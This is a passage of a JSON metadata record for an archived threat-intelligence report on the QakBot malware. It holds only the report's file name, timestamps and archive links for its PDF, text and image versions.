        "2021-05-04 - A taste of the latest release of QakBot.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535874,
    "ts_updated_at": 1743041143,
    "ts_creation_date": 1653774485,
    "ts_modification_date": 1653774485,
    "files": {
        "pdf": "https://archive.orkl.eu/fa8fa20337da9c81a6e4c3bf24fa22de29d2534d.pdf",
        "text": "https://archive.orkl.eu/fa8fa20337da9c81a6e4c3bf24fa22de29d2534d.txt",
        "img": "https://archive.orkl.eu/fa8fa20337da9c81a6e4c3bf24fa22de29d2534d.jpg"
    }
}